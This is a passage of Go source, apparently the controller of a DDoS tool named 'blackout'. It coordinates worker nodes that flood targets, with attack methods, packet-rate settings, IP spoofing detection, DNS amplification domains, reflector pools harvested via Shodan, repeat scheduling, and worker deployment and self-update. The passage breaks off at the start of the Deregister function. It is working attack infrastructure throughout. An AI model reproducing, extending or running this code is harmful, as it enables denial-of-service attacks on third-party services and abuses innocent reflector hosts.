package controller

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"blackout/internal/attack"
	pb "blackout/internal/proto"
	"blackout/internal/reflector"
	"blackout/web"

	"github.com/gorilla/websocket"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/reflection"
	"google.golang.org/grpc/status"
)

type NodeInfo struct {
	WorkerID      string    `json:"worker_id"`
	IP            string    `json:"ip"`
	CPU           int32     `json:"cpu_cores"`
	CpuPercent    int32     `json:"cpu_percent"`
	Memory        int64     `json:"memory_mb"`
	Bandwidth     int32     `json:"bandwidth_mbps"`
	Location      string    `json:"location"`
	Tags          []string  `json:"tags"`
	Status        string    `json:"status"`
	LastHeartbeat time.Time `json:"last_heartbeat"`
	IsWindows     bool      `json:"is_windows"`
	// CanSpoof 表示该节点是否支持 IP 伪造（默认 false，注册后由探测确定）。
	// SpoofTested 表示是否已完成探测：false = 待检测（UI 显示"待检测"而非"不支持"）。
	// 平台确定不支持（Windows/非 root/编译不支持）时 SpoofTested=true 且 CanSpoof=false；
	// 探测验证成功 → SpoofTested=true, CanSpoof=true。
	CanSpoof    bool `json:"can_spoof"`
	SpoofTested bool `json:"spoof_tested"`
	// Platform 平台标识（lw 节点：os-arch，如 "linux-mipsel"；Go worker 留空）
	Platform string `json:"platform,omitempty"`
}

type SubAttackInfo struct {
	Method       string `json:"method"`
	Threads      int32  `json:"threads"`
	PacketSize   int32  `json:"packet_size"`
	RateLimitPPS int64  `json:"rate_limit_pps"`
	RateLimitBPS int64  `json:"rate_limit_bps"`
	Game         string `json:"game"`
	BurstMode    bool   `json:"burst_mode"`
	JitterMs     int32  `json:"jitter_ms"`
}

type TaskInfo struct {
	TaskID        string          `json:"task_id"`
	Target        string          `json:"target"`
	Method        string          `json:"method"`
	Duration      int32           `json:"duration"`
	Threads       int32           `json:"threads"`
	PacketSize    int32           `json:"packet_size"`
	Mix           bool            `json:"mix"`
	Game          string          `json:"game"`
	RateLimitPPS  int64           `json:"rate_limit_pps"`
	RateLimitBPS  int64           `json:"rate_limit_bps"`
	BurstMode     bool            `json:"burst_mode"`
	JitterMs      int32           `json:"jitter_ms"`
	SpoofIP       bool            `json:"spoof_ip"`
	FallbackToUDP bool            `json:"fallback_to_udp"`
	SubAttacks    []SubAttackInfo `json:"sub_attacks,omitempty"`
	// SelectedWorkers 指定参与任务的节点；空 = 全部在线节点
	SelectedWorkers []string              `json:"selected_workers,omitempty"`
	Status          string                `json:"status"`
	CreatedAt       time.Time             `json:"created_at"`
	Workers         map[string]*TaskStats `json:"workers"`
	RetryCount      int                   `json:"retry_count"`
	StartTime       time.Time             `json:"start_time"`
	// CancelAcks 记录已确认收到取消指令的 worker（key=workerID）。
	// 任务须待所有持有它的在线 worker 全部确认后才结束，避免多 worker 停战失效。
	CancelAcks map[string]bool `json:"-"`
	// CancelToRetry 表示本次取消是超时重试触发的：全部确认后转 pending 重新派发，
	// 而不是 completed。防止重试时旧攻击仍在运行导致同一任务双份流量叠加。
	CancelToRetry bool `json:"-"`
	// CancellingSince 进入 cancelling 状态的时刻：超时兜底（5 分钟无进展强制终结），
	// 防止个别 worker 确认永远丢失导致任务永久卡在 cancelling。
	CancellingSince time.Time `json:"-"`
	// FinishedAt 进入终态（completed/failed）的时刻：内存任务保留 10 分钟后
	// 由 watchTaskTimeout 清理（历史已落库 attack_logs，可安全删除）。
	FinishedAt time.Time `json:"finished_at"`
	// 重复攻击调度：RepeatCount=总次数（0/1=单次），RepeatLeft=剩余次数，
	// RepeatInterval=间隔秒，NextRunAt=下一次执行时间（未到不派发）。
	// 自然完成时递减 RepeatLeft 并创建续发任务；用户 stop 终止整个序列。
	RepeatCount    int       `json:"repeat_count"`
	RepeatLeft     int       `json:"repeat_left"`
	RepeatInterval int       `json:"repeat_interval"`
	NextRunAt      time.Time `json:"next_run_at"`
	StoppedByUser  bool      `json:"-"`
	// Priority 1=高优先级（插队派发），0=普通
	Priority int `json:"priority"`
	// ParentTaskID 重复序列的起始任务 ID（用于终止整个序列）
	ParentTaskID string `json:"parent_task_id,omitempty"`
}

type TaskStats struct {
	WorkerID    string  `json:"worker_id"`
	PacketsSent uint64  `json:"packets_sent"`
	BytesSent   uint64  `json:"bytes_sent"`
	Errors      uint64  `json:"errors"`
	CurrentPPS  uint64  `json:"current_pps"`
	CurrentBPS  uint64  `json:"current_bps"`
	Elapsed     float64 `json:"elapsed_seconds"`
	Finished    bool    `json:"finished"`
	ErrorMsg    string  `json:"error_msg,omitempty"`
}

type WSClient struct {
	conn *websocket.Conn
	// sendCh 每个客户端独占的写缓冲：broadcast 只做非阻塞入队，
	// 慢消费者/死连接不再阻塞心跳处理（此前同步写最多卡 2s×死连接数）。
	// 缓冲满时直接丢弃新消息（nodes/task 类消息 3s 内会再广播，可容忍）。
	sendCh chan []byte
}

type Ctrl struct {
	pb.UnimplementedNodeServiceServer
	mu                sync.RWMutex
	regMu             sync.Mutex // 注册互斥体：串行化 Register/Deregister，防止同一 worker 并发注册导致反复上线
	nodes             map[string]*NodeInfo
	kicked            map[string]bool // 被踢出的 worker：心跳返回 kick，等待其自行退出
	tasks             map[string]*TaskInfo
	templates         map[string]AttackTemplate
	pendingIDs        []string
	cancelIDs         []string
	wsClients         map[*WSClient]bool
	wsMu              sync.RWMutex
	grpcAddr          string
	httpAddr          string
	adminToken        string
	workerToken       string
	proxyFile         string
	proxyData         []byte
	proxyMu           sync.RWMutex
	dnsAmpFile        string
	dnsAmpDomain      string
	dnsAmpDomainsFile string
	dnsAmpMu          sync.RWMutex
	poolVersion       map[string]int64 // game -> version timestamp
	poolVersionMu     sync.RWMutex
	workerTokensMu    sync.RWMutex
	workerTokens      map[string]bool // token → enabled
	// workerTokenFiles 记录 token → 文件路径，撤销时删除文件防止重启后复活
	workerTokenFiles map[string]string
	// 快速上线：云存储 URL（worker 二进制直链），Web UI 拼接地址+token 生成部署命令
	deployFile       string
	deployStorageURL string
	deployMu         sync.RWMutex
	// 公网 IP 缓存：快速上线自动探测，TTL 1 小时，避免每次请求都打外部 API
	publicIP      string
	publicIPAt    time.Time
	publicIPCache sync.RWMutex
	// 云更新：目标版本 + 下载 URL，Worker 轮询后自动更新
	updateFile    string
	updateVersion string
	updateURL     string
	// updateSHA256Linux/updateSHA256Windows：对应平台二进制的 SHA-256
	// （从 GitHub Release API 的 asset digest 获取并缓存）。Worker 下载后
	// 强制比对，防止供应链注入/下载损坏。空值 = 未配置（Worker 将拒绝更新）。
	updateSHA256Linux   string
	updateSHA256Windows string
	updateMu            sync.RWMutex
	// updateApplyMu 串行化 Controller 自更新流程：并发更新写同一临时文件
	// 会撕裂二进制、破坏备份恢复
	updateApplyMu sync.Mutex
	// GitHub Token（可选）：认证后 API 速率限制 5000/小时（未认证仅 60/小时），
	// 并支持查询版本列表选择任意版本。持久化在 data/github_token.txt。
	githubTokenFile string
	githubTokenMu   sync.RWMutex
	githubToken     string
	// 伪造能力缓存：IP → 是否支持伪造（探测一次后持久化，同 IP 重新上线
	// 直接打标签，避免每次启动重复探测）。持久化在 data/spoof_cache.json。
	spoofCacheFile string
	spoofCacheMu   sync.RWMutex
	spoofCache     map[string]bool
	// 节点表持久化：data/nodes.json。Controller 重启后节点身份/IP/伪造能力
	// 不丢失（心跳 3s 内自动恢复在线状态），避免节点反复"从零注册"。
	nodesFile string
	// 节点分组：组名 → 节点 ID 列表。持久化在 data/node_groups.json。
	// 分组是节点的快捷多选（派发时展开为 workers），CRUD 见 node_groups.go。
	nodeGroupsFile string
	nodeGroupsMu   sync.RWMutex
	nodeGroups     map[string][]string
	// 环境迁移（见 migrate.go）：非空 = 迁移模式，心跳响应携带新 controller
	// 地址，worker 收到后自动切换连接。workerToken 为空时 worker 沿用自身
	// 已有 token（数据导入时已带过去）。
	migrateMu     sync.RWMutex
	migrateTarget string
	migrateToken  string
	// 目标保护规则（见 target_guard.go）：防止误攻击内网/黑名单目标
	guardFile string
	guard     TargetGuard
	guardMu   sync.RWMutex
	// 操作审计（见 audit.go）：谁/何时/做了什么
	auditLog *AuditLog
	// 编译信息：Version 标记 Controller 自身（与 Worker 版本对齐），
	// GitRepo 用于云更新默认 GitHub Release 下载地址拼接
	build BuildInfo
}

// BuildInfo 编译时注入的构建信息
type BuildInfo struct {
	Version string // 发布标签（如 v1.0.4）；本地手动编译为 "dev"
	GitRepo string // GitHub 仓库（如 2476818641/Blackout）；空 = 未启用默认仓库地址
	GhProxy string // GitHub 转发代理前缀（如 https://cf.liuass.eu.org/ghproxy/）；
	// 国内服务器直连 GitHub 下载慢/失败时的加速通道，空 = 直连
}

// defaultUpdateURL 拼接 GitHub Release 的默认下载地址。
// 配置了 GhProxy 时自动加转发前缀；自定义 URL 时不用它；
// 未配置仓库或版本时返回空（由调用方决定是否回退）。
func (c *Ctrl) defaultUpdateURL(version string, isWindows bool) string {
	if c.build.GitRepo == "" || version == "" {
		return ""
	}
	bin := "worker-linux-amd64"
	if isWindows {
		bin = "worker-windows-amd64.exe"
	}
	u := fmt.Sprintf("https://github.com/%s/releases/download/%s/%s", c.build.GitRepo, version, bin)
	if c.build.GhProxy != "" {
		u = strings.TrimSuffix(c.build.GhProxy, "/") + "/" + u
	}
	return u
}

type AttackTemplate struct {
	Name       string   `json:"name"`
	Method     string   `json:"method"`
	Target     string   `json:"target"`
	Targets    []string `json:"targets"`
	Duration   int32    `json:"duration"`
	Threads    int32    `json:"threads"`
	PacketSize int32    `json:"packet_size"`
	Mix        bool     `json:"mix"`
	Game       string   `json:"game"`
	BurstMode  bool     `json:"burst_mode"`
	JitterMs   int32    `json:"jitter_ms"`
}

func New(grpcAddr, httpAddr string, build BuildInfo) *Ctrl {
	os.MkdirAll("data/auth", 0700)

	adminToken := loadOrGenerate("data/auth/admin.token", 32)
	workerToken := loadOrGenerate("data/auth/worker.token", 32)

	log.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	log.Printf("  Admin Token:  %s... (see data/auth/admin.token)", maskToken(adminToken))
	log.Printf("  Worker Token: %s... (see data/auth/worker.token)", maskToken(workerToken))
	log.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	proxyData, _ := os.ReadFile("data/proxies.txt")

	loadedDomains := loadDomainList("data/dns_amp_domains.txt")
	// 文件存在即视为管理员显式管理的列表（空文件=已清空禁用），
	// 缺失时回退内置域名列表
	if _, err := os.Stat("data/dns_amp_domains.txt"); err == nil {
		attack.SetDomainsExplicit(loadedDomains)
		log.Printf("[dns] loaded %d amp domains (explicit list)", len(loadedDomains))
	} else {
		attack.SetDomains(nil)
	}

	dnsAmpDomain := ""
	if ampDomainBytes, err := os.ReadFile("data/dns_amp_domain.txt"); err == nil {
		dnsAmpDomain = strings.TrimSpace(string(ampDomainBytes))
		if dnsAmpDomain != "" {
			attack.SetAmpDomain(dnsAmpDomain)
			log.Printf("[dns] amp domain: %s", dnsAmpDomain)
		}
	}

	deployStorageURL := ""
	if deployBytes, err := os.ReadFile("data/deploy_storage_url.txt"); err == nil {
		deployStorageURL = strings.TrimSpace(string(deployBytes))
		if deployStorageURL != "" {
			log.Printf("[deploy] storage URL: %s", deployStorageURL)
		}
	}

	// 云更新配置：data/deploy_update.json {"version":"...","url":"...","sha256_linux":"...","sha256_windows":"..."}
	updateVersion, updateURL := "", ""
	updateSHA256Linux, updateSHA256Windows := "", ""
	if updBytes, err := os.ReadFile("data/deploy_update.json"); err == nil {
		var upd struct {
			Version         string `json:"version"`
			URL             string `json:"url"`
			SHA256Linux     string `json:"sha256_linux"`
			SHA256Windows   string `json:"sha256_windows"`
		}
		if json.Unmarshal(updBytes, &upd) == nil {
			updateVersion, updateURL = upd.Version, upd.URL
			updateSHA256Linux, updateSHA256Windows = upd.SHA256Linux, upd.SHA256Windows
			if updateVersion != "" && updateURL != "" {
				log.Printf("[update] target version %s configured (url: %s)", updateVersion, updateURL)
			}
		}
	}

	// GitHub Token：data/github_token.txt
	githubToken := ""
	if tokBytes, err := os.ReadFile("data/github_token.txt"); err == nil {
		githubToken = strings.TrimSpace(string(tokBytes))
		if githubToken != "" {
			log.Printf("[update] GitHub token loaded (authenticated API: 5000 req/h)")
		}
	}

	// 伪造能力缓存：data/spoof_cache.json
	spoofCache := make(map[string]bool)
	if cacheBytes, err := os.ReadFile("data/spoof_cache.json"); err == nil {
		json.Unmarshal(cacheBytes, &spoofCache)
		if len(spoofCache) > 0 {
			log.Printf("[spoof-probe] loaded %d cached spoof results", len(spoofCache))
		}
	}

	// 节点表持久化：data/nodes.json
	restoredNodes := make(map[string]*NodeInfo)
	if nodeBytes, err := os.ReadFile("data/nodes.json"); err == nil {
		var list []*NodeInfo
		if json.Unmarshal(nodeBytes, &list) == nil {
			for _, n := range list {
				if n == nil || n.WorkerID == "" {
					continue
				}
				// 恢复的节点一律先标记 OFFLINE：真实在线状态由首个心跳
				// （≤3s）刷新。保留身份/IP/伪造能力等持久属性。
				n.Status = "OFFLINE"
				restoredNodes[n.WorkerID] = n
			}
			if len(restoredNodes) > 0 {
				log.Printf("[node] restored %d nodes from %s", len(restoredNodes), "data/nodes.json")
			}
		}
	}

	reflector.InitAllPools()
	reflector.MarkStaleRunningLogs()

	ctrl := &Ctrl{
		nodes:             restoredNodes,
		kicked:            make(map[string]bool),
		tasks:             make(map[string]*TaskInfo),
		templates:         make(map[string]AttackTemplate),
		wsClients:         make(map[*WSClient]bool),
		grpcAddr:          grpcAddr,
		httpAddr:          httpAddr,
		adminToken:        adminToken,
		workerToken:       workerToken,
		proxyFile:         "data/proxies.txt",
		proxyData:         proxyData,
		dnsAmpFile:        "data/dns_amp_domain.txt",
		dnsAmpDomainsFile: "data/dns_amp_domains.txt",
		dnsAmpDomain:      dnsAmpDomain,
		poolVersion:       make(map[string]int64),
		workerTokens:      make(map[string]bool),
		workerTokenFiles:  make(map[string]string),
		deployFile:        "data/deploy_storage_url.txt",
		deployStorageURL:  deployStorageURL,
		updateFile:        "data/deploy_update.json",
		updateVersion:     updateVersion,
		updateURL:         updateURL,
		updateSHA256Linux:   updateSHA256Linux,
		updateSHA256Windows: updateSHA256Windows,
		githubTokenFile:   "data/github_token.txt",
		githubToken:       githubToken,
		spoofCacheFile:    "data/spoof_cache.json",
		spoofCache:        spoofCache,
		nodesFile:         "data/nodes.json",
		nodeGroupsFile:    "data/node_groups.json",
		nodeGroups:        loadNodeGroups("data/node_groups.json"),
		guardFile:         "data/target_guard.json",
		guard:             loadTargetGuard("data/target_guard.json"),
		auditLog:          NewAuditLog("data/audit.log", 5000),
		build:             build,
	}

	// 加载 data/auth/workers/ 下的所有 token
	ctrl.loadWorkerTokens()

	if dnsAmpDomain != "" {
		go func() {
			pool := reflector.GetPool("dns")
			if pool == nil {
				return
			}
			ctrl.testGamePool(nil, "dns", pool)
		}()
	}

	ctrl.loadTemplates()
	return ctrl
}

func loadOrGenerate(path string, byteLen int) string {
	data, err := os.ReadFile(path)
	if err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	token := make([]byte, byteLen)
	rand.Read(token)
	tokenStr := hex.EncodeToString(token)
	if err := os.WriteFile(path, []byte(tokenStr), 0600); err != nil {
		log.Printf("[!] Failed to write token file %s: %v", path, err)
	}
	return tokenStr
}

// maskToken 只保留前 8 个字符，避免完整凭据进入日志
func maskToken(token string) string {
	if len(token) <= 8 {
		return "****"
	}
	return token[:8]
}

func loadDomainList(path string) []string {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var domains []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			domains = append(domains, line)
		}
	}
	return domains
}

// guardHandler /api/guard：GET 规则（worker 可读），PUT/POST 修改（仅 admin）
func (c *Ctrl) guardHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "GET":
			c.handleGuard(w, r)
		case "PUT", "POST":
			c.authAdmin(c.handleGuard).ServeHTTP(w, r)
		default:
			http.Error(w, `{"error":"method not allowed"}`, 405)
		}
	}
}

func (c *Ctrl) Start() error {
	lis, err := net.Listen("tcp", c.grpcAddr)
	if err != nil {
		return fmt.Errorf("gRPC listen: %w", err)
	}

	// 尝试加载 TLS 配置
	tlsConfig := LoadTLSConfig()
	var srv *grpc.Server
	if tlsConfig != nil {
		creds := grpc.Creds(NewTLSCredentials(tlsConfig))
		srv = grpc.NewServer(creds)
		log.Printf("[grpc] TLS enabled")
	} else {
		srv = grpc.NewServer()
		log.Printf("[grpc] TLS disabled (insecure mode)")
	}

	pb.RegisterNodeServiceServer(srv, c)
	reflection.Register(srv)

	go func() {
		log.Printf("gRPC server listening on %s", c.grpcAddr)
		if err := srv.Serve(lis); err != nil {
			log.Fatalf("gRPC server: %v", err)
		}
	}()

	go c.watchOfflineNodes()
	go c.watchNodesPersist()
	go c.cronSteamRefresh()
	go c.cronManualTest()
	go c.cronShodanLoad()
	go c.cronCleanupDB()
	go c.watchTaskTimeout()

	// 启动 UDP 探测监听器
	if err := c.startUDPProbeListener(); err != nil {
		log.Printf("[spoof-probe] failed to start UDP listener: %v", err)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/api/nodes", c.authHTTP(c.handleNodes))
	mux.HandleFunc("/api/nodes/", c.authHTTP(c.handleKickNode))
	mux.HandleFunc("/api/tasks", c.authHTTP(c.handleTasks))
	mux.HandleFunc("/api/node-groups", c.authHTTP(c.handleNodeGroups))
	mux.HandleFunc("/api/migrate/export", c.authAdmin(c.handleMigrateExport))
	mux.HandleFunc("/api/migrate/import", c.authAdmin(c.handleMigrateImport))
	mux.HandleFunc("/api/migrate/start", c.authAdmin(c.handleMigrateStart))
	mux.HandleFunc("/api/migrate/stop", c.authAdmin(c.handleMigrateStop))
	mux.HandleFunc("/api/tasks/", c.authHTTP(c.handleTaskByID))
	mux.HandleFunc("/api/scan", c.authHTTP(c.handleScan))
	mux.HandleFunc("/api/l7/test", c.authAdmin(c.handleL7Test))
	mux.HandleFunc("/api/stats", c.authHTTP(c.handleStats))
	mux.HandleFunc("/api/proxy", c.authHTTP(c.handleProxy))
	mux.HandleFunc("/api/dnsamp", c.authHTTP(c.handleDNSAmp))
	mux.HandleFunc("/api/dnsamp/domains", c.authHTTP(c.handleDNSAmpDomains))
	mux.HandleFunc("/api/shodan/refresh", c.authHTTP(c.handleShodanRefresh))
	mux.HandleFunc("/api/shodan/countries", c.authHTTP(c.handleShodanCountries))
	mux.HandleFunc("/api/shodan", c.authHTTP(c.handleShodanConfig))
	mux.HandleFunc("/api/pools", c.authHTTP(c.handlePools))
	mux.HandleFunc("/api/pools/stats", c.authHTTP(c.handlePoolStats))
	mux.HandleFunc("/api/pools/", c.authHTTP(c.handlePoolByGame))
	mux.HandleFunc("/api/reflectors/all", c.authHTTP(c.handleReflectorsAll))
	mux.HandleFunc("/api/reflectors/candidates", c.authHTTP(c.handleReflectorsCandidates))
	mux.HandleFunc("/api/reflectors/version", c.authHTTP(c.handleReflectorsVersion))
	mux.HandleFunc("/api/reflectors/steam", c.authHTTP(c.handleReflectorsSteam))
	mux.HandleFunc("/api/reflectors/manual", c.authHTTP(c.handleReflectorsManual))
	mux.HandleFunc("/api/reflectors/manual/test", c.authHTTP(c.handleReflectorsManualTest))
	mux.HandleFunc("/api/auth", c.handleAuth)
	mux.HandleFunc("/api/templates", c.authHTTP(c.handleTemplates))
	mux.HandleFunc("/api/guard", c.guardHandler())
	mux.HandleFunc("/api/audit", c.authAdmin(c.handleAudit))
	// 轻量伪造 Worker（blackout-lw Rust 节点）接入
	mux.HandleFunc("/api/lw/register", c.authHTTP(c.handleLWRegister))
	mux.HandleFunc("/api/lw/heartbeat", c.authHTTP(c.handleLWHeartbeat))
	mux.HandleFunc("/api/lw/report", c.authHTTP(c.handleLWReport))
	mux.HandleFunc("/api/logs", c.authHTTP(c.handleLogs))
	mux.HandleFunc("/api/logs/stats", c.authHTTP(c.handleLogStats))
	mux.HandleFunc("/api/logs/", c.authHTTP(c.handleLogs))
	mux.HandleFunc("/api/tokens/provision", c.authAdmin(c.handleProvisionToken))
	mux.HandleFunc("/api/tokens/revoke", c.authAdmin(c.handleRevokeToken))
	mux.HandleFunc("/api/deploy/config", c.authHTTP(c.handleDeployConfig))
	mux.HandleFunc("/api/deploy/command", c.authHTTP(c.handleDeployCommand))
	mux.HandleFunc("/api/deploy/update", c.authAdmin(c.handleDeployUpdate))
	mux.HandleFunc("/api/deploy/version", c.authHTTP(c.handleDeployVersion))
	mux.HandleFunc("/api/update/check", c.authHTTP(c.handleUpdateCheck))
	mux.HandleFunc("/api/update/token", c.authAdmin(c.handleUpdateToken))
	mux.HandleFunc("/api/update/controller", c.authAdmin(c.handleUpdateController))
	mux.HandleFunc("/api/update/workers", c.authAdmin(c.handleUpdateWorkers))
	mux.HandleFunc("/api/update/all", c.authAdmin(c.handleUpdateAll))
	mux.HandleFunc("/api/worker/spoof-probe", c.authHTTP(c.handleWorkerSpoofProbe))
	mux.HandleFunc("/api/worker/spoof-probe/result", c.authHTTP(c.handleSpoofProbeResult))
	mux.HandleFunc("/api/worker/spoof-status", c.authHTTP(c.handleSpoofStatus))
	mux.HandleFunc("/api/worker/spoof-cache", c.authHTTP(c.handleSpoofCacheQuery))
	mux.HandleFunc("/api/tasks/complete", c.authHTTP(c.handleTaskComplete))
	mux.HandleFunc("/ws", c.handleWS)
	mux.HandleFunc("/pool", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFileFS(w, r, web.StaticFS, "pool.html")
	})
	mux.Handle("/", http.FileServerFS(web.StaticFS))

	log.Printf("HTTP server listening on %s", c.httpAddr)
	if tlsConfig != nil {
		// TLS 模式下仍接受明文请求并 301 重定向到 https：
		// 用户误用 http:// 访问或扫描器探测时不再触发 TLS 握手失败日志刷屏。
		// 重定向 handler 基于 r.TLS 判断（明文连接 r.TLS == nil）。
		handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.TLS == nil {
				host := r.Host
				if host == "" {
					host = r.URL.Host
				}
				target := "https://" + host + r.URL.RequestURI()
				http.Redirect(w, r, target, http.StatusMovedPermanently)
				return
			}
			corsMiddleware(mux).ServeHTTP(w, r)
		})
		return serveAutoTLS(c.httpAddr, tlsConfig, handler)
	}
	return http.ListenAndServe(c.httpAddr, corsMiddleware(mux))
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type,Authorization")
		if r.Method == "OPTIONS" {
			w.WriteHeader(200)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func (c *Ctrl) authHTTP(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		// 接受 admin / 共享 worker / per-worker 三类凭据；高危管理端点
		// 必须走 authAdmin（仅 admin），避免 worker 凭据越权。
		if token != c.adminToken && token != c.workerToken && !c.workerTokenEnabled(token) {
			http.Error(w, `{"error":"unauthorized"}`, 401)
			return
		}
		next(w, r)
	}
}

// workerTokenEnabled 检查 token 是否为已签发的 per-worker token 且未被撤销
func (c *Ctrl) workerTokenEnabled(token string) bool {
	c.workerTokensMu.RLock()
	enabled, ok := c.workerTokens[token]
	c.workerTokensMu.RUnlock()
	return ok && enabled
}

// authAdmin 仅允许 adminToken 通过，用于 worker token 的签发/撤销等高权限操作
func (c *Ctrl) authAdmin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		if token != c.adminToken {
			http.Error(w, `{"error":"unauthorized: admin token required"}`, 403)
			return
		}
		next(w, r)
	}
}

func (c *Ctrl) validateWorkerToken(token string) bool {
	if token == c.workerToken || token == c.adminToken {
		return true
	}
	c.workerTokensMu.RLock()
	enabled, ok := c.workerTokens[token]
	c.workerTokensMu.RUnlock()
	return ok && enabled
}

func (c *Ctrl) nodeExists(id string) bool {
	_, ok := c.nodes[id]
	return ok
}

func (c *Ctrl) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
	// 注册互斥体：同一 worker 的重复/并发注册请求必须排队处理，
	// 保证 ID 分配与节点表更新是原子的，防止同一物理节点被登记多次
	c.regMu.Lock()
	defer c.regMu.Unlock()

	if !c.validateWorkerToken(req.AuthToken) {
		return &pb.RegisterResponse{Success: false, Message: "invalid token"}, nil
	}

	c.mu.Lock()

	assignedID := req.WorkerId
	baseID := strings.TrimRight(req.WorkerId, "0123456789-")
	if baseID == "" {
		// 纯数字 ID（如手动指定的 "12345"）：退化为统一 node 前缀命名
		baseID = "node"
	}

	// 已被踢出的节点：拒绝注册，防止 systemd Restart=always 拉起后自动复活。
	// （Worker 侧也有 data/kicked 标记拦截，这里是 Controller 端兜底。）
	if c.kicked[req.WorkerId] {
		c.mu.Unlock()
		log.Printf("[node] %s register REJECTED (kicked)", req.WorkerId)
		return &pb.RegisterResponse{Success: false, Message: "node kicked"}, nil
	}

	// Worker 的 WAN IP 探测失败时会回退 127.0.0.1 生成 ID（如 127-0-0-1-node1），
	// 多台机器会撞 ID 且无法识别真实节点。Controller 已从 gRPC 连接知道对端 IP，
	// 用对端 IP 重写 ID，保证节点可辨识、ID 唯一。
	if strings.HasPrefix(assignedID, "127-0-0-1-") || strings.HasPrefix(assignedID, "0-0-0-0-") ||
		strings.HasPrefix(assignedID, "localhost-") {
		if p, ok := peerFromContext(ctx); ok {
			host, _, err := net.SplitHostPort(p)
			if err == nil {
				host = strings.Trim(host, "[]")
				if net.ParseIP(host) != nil && !strings.Contains(host, ":") {
					assignedID = strings.ReplaceAll(host, ".", "-") + "-node1"
					baseID = strings.TrimRight(assignedID, "0123456789-")
					if baseID == "" {
						baseID = "node"
					}
				}
			}
		}
	}

	reused := false
	nodeIP := ""
	peerIP := ""
	if p, ok := peerFromContext(ctx); ok {
		host, _, err := net.SplitHostPort(p)
		if err == nil {
			peerIP = strings.Trim(host, "[]")
		} else {
			// peerFromContext 可能返回纯 IP（无端口）
			peerIP = strings.Trim(p, "[]")
		}
	}

	// 复用离线条目：同一 worker 断连/崩溃后重启重新注册时，若旧条目仍在
	// （离线保留窗口内），直接复用原条目刷新状态，而不是生成 node2/node3…
	// 造成同一物理节点反复上线、僵尸节点累积
	if existing, ok := c.nodes[assignedID]; ok && existing.Status == "OFFLINE" {
		existing.WorkerID = assignedID
		existing.CPU = req.CpuCores
		existing.CpuPercent = 0
		existing.Memory = req.MemoryMb
		existing.Bandwidth = req.BandwidthMbps
		existing.Location = req.Location
		existing.Tags = req.Tags
		existing.Status = "READY"
		existing.LastHeartbeat = time.Now()
		existing.IsWindows = req.IsWindows
		if peerIP != "" {
			existing.IP = peerIP
		}
		nodeIP = existing.IP
		reused = true
	} else if existing, ok := c.nodes[assignedID]; ok && peerIP != "" && existing.IP == peerIP {
		// 同 IP 复用（保险）：云更新重启时旧条目可能仍非 OFFLINE
		// （Linux exec 保持 PID / Windows spawn 旧进程未退出 / deregister 失败）。
		// 对端 IP 一致说明是同一物理节点重注册，复用原 ID 而非生成 node2。
		// 仅当 IP 完全相同才复用，避免误合并同网段的不同节点。
		log.Printf("[node] %s re-registered from same IP %s (reusing entry, prev status=%s)", assignedID, peerIP, existing.Status)
		existing.WorkerID = assignedID
		existing.CPU = req.CpuCores
		existing.CpuPercent = 0
		existing.Memory = req.MemoryMb
		existing.Bandwidth = req.BandwidthMbps
		existing.Location = req.Location
		existing.Tags = req.Tags
		existing.Status = "READY"
		existing.LastHeartbeat = time.Now()
		existing.IsWindows = req.IsWindows
		existing.IP = peerIP
		nodeIP = peerIP
		reused = true
	}

	if !reused {
		suffix := 1
		for c.nodeExists(assignedID) {
			suffix++
			assignedID = fmt.Sprintf("%s%d", baseID, suffix)
		}

		// IP 伪造能力默认标记（保守，绝不乐观置 true）：
		// - Windows / 编译不支持 → 确定不支持（SpoofTested=true）
		// - Linux + 编译支持 → 待检测（SpoofTested=false），
		//   由 spoof-probe 探测确认（非 root 由 worker 上报确定不支持）
		canSpoof := false
		spoofTested := req.IsWindows || !attack.SupportsSpoofing()

		node := &NodeInfo{
			WorkerID:      assignedID,
			CPU:           req.CpuCores,
			Memory:        req.MemoryMb,
			Bandwidth:     req.BandwidthMbps,
			Location:      req.Location,
			Tags:          req.Tags,
			Status:        "READY",
			LastHeartbeat: time.Now(),
			IsWindows:     req.IsWindows,
			CanSpoof:      canSpoof,
			SpoofTested:   spoofTested,
		}

		if p, ok := peerFromContext(ctx); ok {
			node.IP = p
		}
		nodeIP = node.IP

		c.nodes[assignedID] = node
	}

	c.mu.Unlock()

	if reused {
		log.Printf("[node] %s re-registered (reused offline entry, IP:%s, Win:%v)", assignedID, nodeIP, req.IsWindows)
	} else {
		log.Printf("[node] %s registered (%s, IP:%s, Win:%v)", assignedID, req.Location, nodeIP, req.IsWindows)
	}

	c.persistNodes()
	c.broadcastWS("nodes", c.listNodesForBroadcast())

	return &pb.RegisterResponse{Success: true, Message: "registered", AssignedId: assignedID}, nil
}

func (c *Ctrl) Deregister(ctx context.Context, req *pb.DeregisterRequest) (*pb.DeregisterResponse, error) {
